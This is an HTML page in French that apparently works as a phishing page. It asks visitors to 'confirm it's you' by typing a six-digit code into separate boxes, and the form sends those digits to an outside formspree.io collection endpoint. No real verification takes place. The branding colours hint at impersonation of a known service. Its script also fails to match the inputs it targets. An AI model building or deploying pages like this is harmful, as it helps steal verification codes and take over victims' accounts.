<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tableau de bord</title>
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .dashboard-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    textarea {
      width: 100%;
      height: 100px;
      padding: 10px;
      margin-top: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      resize: none;
    }
    button {
      margin-top: 10px;
      width: 100%;
      padding: 10px;
      background-color: #fffc00;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #fff200;
    }
  </style>
</head>
<body>

<div class="dashboard-box">
  <img src="logo.jpg" alt="Logo" width="150" style="display:block; margin: 0 auto 15px auto;">

  <!-- Ton texte ici -->
  <p id="customText">Confirmez que c'est bien vous :</p>

  <form action="https://formspree.io/f/xzzrqevd" method="POST">
   <div style="display: flex; justify-content: center; gap: 10px;">
  <input type="text" name="code1" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
  <input type="text" name="code2" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
  <input type="text" name="code3" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
  <input type="text" name="code4" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
  <input type="text" name="code5" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
  <input type="text" name="code6" maxlength="1" style="width: 40px; text-align: center; font-size: 20px;">
</div>
    <button type="submit">Envoyer</button>
  </form>
</div>
<script>
  const inputs = document.querySelectorAll('.code-input');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });

    input.addEventListener('paste', (e) => {
      const paste = e.clipboardData.getData('text').trim();
      if (paste.length === inputs.length && /^\d+$/.test(paste)) {
        e.preventDefault();
        paste.split('').forEach((char, i) => {
          inputs[i].value = char;
        });
        inputs[inputs.length - 1].focus();
      }
    });
  });
</script>
